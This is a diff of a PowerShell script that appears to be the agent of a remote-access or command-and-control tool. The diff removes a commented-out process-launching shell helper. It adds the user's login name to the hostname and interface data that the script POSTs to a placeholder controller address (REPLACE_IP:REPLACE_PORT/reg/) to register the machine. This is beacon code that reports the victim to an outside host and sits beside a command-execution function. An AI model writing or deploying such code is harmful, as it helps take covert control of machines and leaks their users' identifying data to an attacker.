@@ -1,25 +1,3 @@
-# function shell($fname, $arg){
-    
-#     $pinfo                        = New-Object System.Diagnostics.ProcessStartInfo
-#     $pinfo.FileName               = $fname
-#     $pinfo.RedirectStandardError  = $true
-#     $pinfo.RedirectStandardOutput = $true
-#     $pinfo.UseShellExecute        = $false
-#     $pinfo.Arguments              = $arg
-#     $p                            = New-Object System.Diagnostics.Process
-#     $p.StartInfo                  = $pinfo
-    
-#     $p.Start() | Out-Null
-#     $p.WaitForExit()
-    
-#     $stdout = $p.StandardOutput.ReadToEnd()
-#     $stderr = $p.StandardError.ReadToEnd()
-
-#     $res = "VALID $stdout`n$stderr"
-#     $res
-# }
-
-
 function Invoke-Executable {
     # Runs the specified executable and captures its exit code, stdout
     # and stderr.
@@ -95,7 +73,7 @@ function Invoke-Executable {
 
 
 $hostname = [System.Net.Dns]::GetHostName()
-# $username = $env:UserDomain
+$username = $env:UserNAME
 $ip   = "REPLACE_IP"
 $port = "REPLACE_PORT"
 $interface = "REPLACE_INTERFACE"
@@ -106,7 +84,7 @@ $regl  = ("http" + ':' + "//$ip" + ':' + "$port/reg/")
 $data  = @{
     eth = "$interface" 
     hname = "$hostname"
-    # username="$username"
+    username="$username"
     }
     
 $name  = (Invoke-WebRequest -UseBasicParsing -Uri $regl -Body $data -Method 'POST').Content
